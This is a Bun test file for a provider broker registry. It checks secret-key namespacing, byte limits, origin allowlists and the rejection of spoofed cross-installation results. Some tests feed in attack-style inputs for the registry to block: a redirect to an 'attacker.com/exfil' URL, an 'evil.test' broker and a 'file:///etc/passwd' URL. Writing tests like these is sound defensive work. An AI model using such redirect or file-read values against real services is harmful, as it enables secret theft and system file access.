import { describe, expect, test } from "bun:test";
import {
  PROVIDER_REQUEST_MAX_BYTES,
  ProviderRegistry,
  measureJsonBytes,
  parseExtensionSecretKey,
  type BrokerRequest,
  type ProviderHostToWorker,
} from "./provider-registry";

function brokerRegistry(overrides: Partial<ConstructorParameters<typeof ProviderRegistry>[0]> = {}) {
  const fetchedUrls: string[] = [];
  const registry = new ProviderRegistry({
    timeoutMs: 200,
    fetch: async (url) => {
      fetchedUrls.push(url);
      return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
    },
    ...overrides,
  });
  return { registry, fetchedUrls };
}

describe("provider broker security", () => {
  test("byte accounting includes raw and nested binary payloads", () => {
    const bytes = 10 * 1024 * 1024;
    expect(measureJsonBytes(new ArrayBuffer(bytes))).toBeGreaterThan(bytes);
    expect(measureJsonBytes({ body: new ArrayBuffer(bytes) })).toBeGreaterThan(bytes);
    expect(measureJsonBytes(new Uint8Array(bytes))).toBeGreaterThan(bytes);
    expect(() => {
      const { registry } = brokerRegistry();
      registry.prepareBroker({
        kind: "tts",
        url: "https://provider.test/tts",
        body: new ArrayBuffer(PROVIDER_REQUEST_MAX_BYTES + 1),
        correlationId: "oversized-binary",
      }, { installationId: "inst-a", installScope: "system" });
    }).toThrow(/exceeds/);
  });

  test("reads broker responses through a hard streaming byte limit", async () => {
    let sent = 0;
    const chunk = new Uint8Array(700_000).fill(65);
    const stream = new ReadableStream<Uint8Array>({
      pull(controller) {
        if (sent >= 1_400_000) {
          controller.close();
          return;
        }
        controller.enqueue(chunk);
        sent += chunk.byteLength;
      },
    });
    const { registry } = brokerRegistry({
      fetch: async () => new Response(stream, { headers: { "content-type": "text/plain" } }),
    });
    const result = await registry.completeBroker({
      kind: "tts",
      url: "https://provider.test/tts",
      method: "POST",
      headers: {},
      body: null,
      binary: false,
      secretKey: null,
      installationId: "inst-a",
      authenticatedSubject: "",
      correlationId: "large-response",
      round: 1,
      workerView: {},
    });
    expect(result.ok).toBe(false);
    expect(result.error).toMatch(/provider response exceeds/);
    expect(sent).toBeLessThanOrEqual(1_400_000);
  });

  test("parseExtensionSecretKey only accepts extension:<installationId>:<name>", () => {
    expect(parseExtensionSecretKey("extension:inst-a:embedding-key")).toEqual({
      installationId: "inst-a",
      name: "embedding-key",
    });
    expect(parseExtensionSecretKey("openai_api_key")).toBeNull();
    expect(parseExtensionSecretKey("user:alice:openai_api_key")).toBeNull();
    expect(parseExtensionSecretKey("extension:inst-a:")).toBeNull();
    expect(parseExtensionSecretKey("extension::embedding-key")).toBeNull();
  });

  test("registering a broker with a global secretKey fails with authorization error", () => {
    const { registry, fetchedUrls } = brokerRegistry();
    expect(() =>
      registry.register({
        kind: "embedding",
        id: "foo",
        broker: { kind: "embedding", url: "https://provider.test/embed", secretKey: "openai_api_key" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).toThrow(/authorization denied/);
    expect(fetchedUrls).toEqual([]);
  });

  test("prepareBroker and completeBroker reject unnamespaced secretKeys before any fetch", async () => {
    const secretLookups: string[] = [];
    const { registry, fetchedUrls } = brokerRegistry({
      getSecret: async (_userId, key) => {
        secretLookups.push(key);
        return "leaked";
      },
    });

    const request: BrokerRequest = {
      kind: "embedding",
      url: "https://provider.test/embed",
      secretKey: "openai_api_key",
      correlationId: "sec-1",
    };

    let threw = false;
    try {
      const prepared = registry.prepareBroker(request, {
        installScope: "user",
        authenticatedSubject: "alice",
        installedByUserId: "alice",
        installationId: "inst-a",
      });
      await registry.completeBroker(prepared);
    } catch (err) {
      threw = true;
      expect((err as Error).message).toMatch(/authorization denied/);
    }
    expect(threw).toBe(true);
    expect(secretLookups).toEqual([]);
    expect(fetchedUrls).toEqual([]);

    // A hand-crafted prepared envelope with a global key is still rejected
    // host-side immediately before the fetch.
    await expect(
      registry.completeBroker({
        kind: "embedding",
        url: "https://provider.test/embed",
        method: "POST",
        headers: {},
        body: undefined,
        binary: false,
        secretKey: "openai_api_key",
        installationId: "inst-a",
        authenticatedSubject: "alice",
        correlationId: "sec-2",
        round: 1,
        workerView: {},
      }),
    ).rejects.toThrow(/authorization denied/);
    expect(secretLookups).toEqual([]);
    expect(fetchedUrls).toEqual([]);
  });

  test("secretKey scoped to another installation is rejected", async () => {
    const { registry } = brokerRegistry();
    expect(() =>
      registry.prepareBroker({
        kind: "tts",
        url: "https://provider.test/tts",
        secretKey: "extension:inst-b:tts-key",
        correlationId: "sec-3",
      }, {
        installScope: "user",
        authenticatedSubject: "alice",
        installedByUserId: "alice",
        installationId: "inst-a",
      }),
    ).toThrow(/does not match installation/);
  });

  test("user-scoped install with forged subject fields resolves under its own userId, never __system__", async () => {
    const lookups: Array<{ userId: string; key: string }> = [];
    const { registry, fetchedUrls } = brokerRegistry({
      getSecret: async (userId, key) => {
        lookups.push({ userId, key });
        return "user-token";
      },
      fetch: async (url) => {
        fetchedUrls.push(url);
        return new Response("{}", { status: 200, headers: { "content-type": "application/json" } });
      },
    });

    // Forged request payload fields claim the system principal; the host must
    // ignore them and resolve under the authenticated user's own subject.
    const request: BrokerRequest = {
      kind: "embedding",
      url: "https://provider.test/embed",
      secretKey: "extension:inst-a:embedding-key",
      userId: "__system__",
      owner: "__system__",
      correlationId: "forged-1",
    };
    const prepared = registry.prepareBroker(request, {
      installScope: "user",
      authenticatedSubject: "alice",
      installedByUserId: "alice",
      installationId: "inst-a",
    });

    expect(prepared.authenticatedSubject).toBe("alice");
    await registry.completeBroker(prepared);
    expect(lookups).toEqual([{ userId: "alice", key: "extension:inst-a:embedding-key" }]);
    expect(lookups.every((l) => l.userId !== "__system__")).toBe(true);
    expect(fetchedUrls).toEqual(["https://provider.test/embed"]);
  });

  test("system scope rejects unnamespaced and cross-installation secretKeys", () => {
    const { registry } = brokerRegistry();
    const systemHost = { installScope: "system" as const, installationId: "inst-sys" };
    expect(() =>
      registry.prepareBroker({
        kind: "sidecar",
        url: "https://provider.test/v1",
        secretKey: "openai_api_key",
        correlationId: "sys-sec-1",
      }, systemHost),
    ).toThrow(/authorization denied/);
    expect(() =>
      registry.prepareBroker({
        kind: "sidecar",
        url: "https://provider.test/v1",
        secretKey: "extension:inst-other:api-key",
        correlationId: "sys-sec-2",
      }, systemHost),
    ).toThrow(/does not match installation/);
  });

  test("missing system-principal secret row reports provider secret is not available", async () => {
    const lookups: Array<{ userId: string; key: string }> = [];
    const { registry, fetchedUrls } = brokerRegistry({
      getSecret: async (userId, key) => {
        lookups.push({ userId, key });
        return null;
      },
    });
    const prepared = registry.prepareBroker({
      kind: "sidecar",
      url: "https://provider.test/v1",
      secretKey: "extension:inst-sys:api-key",
      correlationId: "sys-miss-1",
    }, { installScope: "system" as const, installationId: "inst-sys" });
    await expect(registry.completeBroker(prepared)).rejects.toThrow(/provider secret is not available/);
    expect(lookups).toEqual([{ userId: "__system__", key: "extension:inst-sys:api-key" }]);
    expect(fetchedUrls).toEqual([]);
  });

  test("invoke cannot override the registration-time broker url", async () => {
    const { registry, fetchedUrls } = brokerRegistry();
    registry.register({
      kind: "sidecar",
      id: "tools",
      broker: { kind: "sidecar", url: "https://good.test/v1" },
    }, {
      installationId: "inst-a",
      installScope: "user",
      authenticatedSubject: "alice",
    });

    const response = await registry.invoke(
      { effectiveScope: "user:alice", installationId: "inst-a", kind: "sidecar", id: "tools" },
      { url: "https://attacker.com/exfil", body: { steal: true } },
      { callerScope: "user:alice", correlationId: "url-1" },
    );

    expect(response).toBeTruthy();
    expect(fetchedUrls).toEqual(["https://good.test/v1"]);
  });

  test("registration rejects unapproved origins when an allowlist is configured", () => {
    const { registry } = brokerRegistry({ approvedBrokerOrigins: ["https://approved.test"] });
    expect(() =>
      registry.register({
        kind: "stt",
        id: "transcribe",
        broker: { kind: "stt", url: "https://evil.test/stt" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).toThrow(/origin is not approved/);
    // Non-http(s) schemes are rejected even without an allowlist.
    const open = brokerRegistry().registry;
    expect(() =>
      open.register({
        kind: "stt",
        id: "transcribe",
        broker: { kind: "stt", url: "file:///etc/passwd" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).toThrow(/http or https/);
  });

  test("registration is allowed when the origin is listed in the allowlist", () => {
    const { registry } = brokerRegistry({ approvedBrokerOrigins: ["https://approved.test"] });
    expect(() =>
      registry.register({
        kind: "stt",
        id: "transcribe",
        broker: { kind: "stt", url: "https://approved.test/stt" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).not.toThrow();
  });

  test("port mismatch is rejected against the approved origin", () => {
    const { registry } = brokerRegistry({ approvedBrokerOrigins: ["https://approved.test:8443"] });
    expect(() =>
      registry.register({
        kind: "stt",
        id: "transcribe",
        broker: { kind: "stt", url: "https://approved.test/stt" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).toThrow(/origin is not approved/);
  });

  test("allowlist matching is case-insensitive", () => {
    const { registry } = brokerRegistry({ approvedBrokerOrigins: ["https://APPROVED.test:8443"] });
    expect(() =>
      registry.register({
        kind: "stt",
        id: "transcribe",
        broker: { kind: "stt", url: "https://approved.TEST:8443/stt" },
      }, {
        installationId: "inst-a",
        installScope: "user",
        authenticatedSubject: "alice",
      }),
    ).not.toThrow();
  });

  test("enforcement survives a mid-life configure() update of the allowlist", () => {
    const { registry } = brokerRegistry();
    const base = {
      installationId: "inst-a",
      installScope: "user" as const,
      authenticatedSubject: "alice",
    };

    // Empty allowlist starts permissive.
    expect(() =>
      registry.register({
        kind: "stt",
        id: "before",
        broker: { kind: "stt", url: "https://anything.test/stt" },
      }, base),
    ).not.toThrow();

    // Tightening the allowlist applies to subsequent registrations.
    registry.configure({ approvedBrokerOrigins: ["https://approved.test"] });
    expect(() =>
      registry.register({
        kind: "stt",
        id: "after",
        broker: { kind: "stt", url: "https://anything.test/stt" },
      }, base),
    ).toThrow(/origin is not approved/);
    expect(() =>
      registry.register({
        kind: "stt",
        id: "after-ok",
        broker: { kind: "stt", url: "https://approved.test/stt" },
      }, base),
    ).not.toThrow();

    // Loosening back to empty restores permissive behavior.
    registry.configure({ approvedBrokerOrigins: [] });
    expect(() =>
      registry.register({
        kind: "stt",
        id: "loosened",
        broker: { kind: "stt", url: "https://other.test/stt" },
      }, base),
    ).not.toThrow();
  });

  test("allowlistKey must match an approved broker configuration", () => {
    const approved = brokerRegistry({ approvedAllowlistKeys: ["sidecar"] }).registry;
    const base = {
      installScope: "user" as const,
      authenticatedSubject: "alice",
      installedByUserId: "alice",
      installationId: "inst-a",
    };
    expect(() =>
      approved.prepareBroker({
        kind: "sidecar",
        url: "https://good.test/v1",
        allowlistKey: "attacker-config",
        correlationId: "al-1",
      }, base),
    ).toThrow(/not an approved broker configuration/);
    expect(
      approved.prepareBroker({
        kind: "sidecar",
        url: "https://good.test/v1",
        allowlistKey: "sidecar",
        correlationId: "al-2",
      }, base).correlationId,
    ).toBe("al-2");
  });

  test("cross-installation provider_result is rejected", async () => {
    const outboundA: ProviderHostToWorker[] = [];
    const outboundB: ProviderHostToWorker[] = [];
    const registry = new ProviderRegistry({ timeoutMs: 60 });
    registry.attachWorker("inst-a", (message) => outboundA.push(message));
    registry.attachWorker("inst-b", (message) => outboundB.push(message));
    registry.register(
      { kind: "embedding", id: "foo" },
      { installationId: "inst-a", installScope: "user", authenticatedSubject: "alice" },
    );
    registry.register(
      { kind: "embedding", id: "foo" },
      { installationId: "inst-b", installScope: "user", authenticatedSubject: "bob" },
    );

    const pending = registry.invoke(
      { effectiveScope: "user:alice", installationId: "inst-a", kind: "embedding", id: "foo" },
      { text: "hello" },
      { callerScope: "user:alice", correlationId: "x-inst-1" },
    );

    // inst-b attempts to inject a result into inst-a's invocation.
    expect(
      registry.handleProviderResult(
        {
          type: "provider_result",
          phase: "result",
          correlationId: "x-inst-1",
          round: 1,
          result: { spoofed: true },
        },
        { installationId: "inst-b", installScope: "user", installedByUserId: "bob" },
      ),
    ).toBe(false);

    // The invocation is torn down (no leak) and rejects rather than resolving
    // with the spoofed payload.
    await expect(pending).rejects.toThrow(/installation mismatch/);
    await new Promise((resolve) => setTimeout(resolve, 5));
  });

  test("timed-out invocations release their correlationId and timer", async () => {
    const outbound: ProviderHostToWorker[] = [];
    const registry = new ProviderRegistry({ timeoutMs: 25 });
    registry.attachWorker("inst-a", (message) => outbound.push(message));
    registry.register(
      { kind: "stt", id: "transcribe" },
      { installationId: "inst-a", installScope: "user", authenticatedSubject: "alice" },
    );

    const pending = registry.invoke(
      { effectiveScope: "user:alice", installationId: "inst-a", kind: "stt", id: "transcribe" },
      { audio: "bytes" },
      { callerScope: "user:alice", correlationId: "leak-1" },
    );
    await expect(pending).rejects.toThrow(/timed out/);

    // Correlation id fully released: late results find no pending entry.
    expect(
      registry.handleProviderResult(
        {
          type: "provider_result",
          phase: "result",
          correlationId: "leak-1",
          round: 1,
          result: { late: true },
        },
        { installationId: "inst-a", installScope: "user", installedByUserId: "alice" },
      ),
    ).toBe(false);
    expect(outbound.some((message) => message.type === "provider_abort")).toBe(true);
  });
});
